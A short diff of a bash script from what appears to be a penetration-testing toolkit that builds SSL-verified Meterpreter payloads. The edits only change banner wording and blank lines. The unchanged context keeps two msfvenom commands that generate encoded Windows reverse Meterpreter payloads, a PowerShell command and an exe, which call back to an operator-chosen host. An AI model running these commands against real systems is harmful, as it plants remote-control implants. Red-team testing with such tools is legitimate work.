@@ -191,7 +191,7 @@ echo "${BlueF}    ╔───────────────────�
 echo "${BlueF}    |${YellowF}    Meterpreter Paranoid Mode (SSL/TLS) connections    ${BlueF}|"
 echo "${BlueF}    ╠───────────────────────────────────────────────────────╣"
 echo "${BlueF}    |${white} This tool allow users to secure your staged/stageless ${BlueF}|"
-echo "${BlueF}    |${white} connections (https) for meterpreter by having it check${BlueF}|"
+echo "${BlueF}    |${white} connections http(s) for meterpreter by having it check${BlueF}|"
 echo "${BlueF}    |${white}  the certificate of the handler it is connecting to.  ${BlueF}|"
 echo "${BlueF}    ╠───────────────────────────────────────────────────────╝"
 sleep 1
@@ -298,7 +298,6 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
      else
        ArCh="x86"
      fi
-
     msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f psh-cmd -o paranoid-staged.$DEFAULT_EXT
 
       #
@@ -360,7 +359,6 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
      else
        ArCh="x86"
      fi
-
     msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f exe -o paranoid-stageless.exe
     sleep 2
 
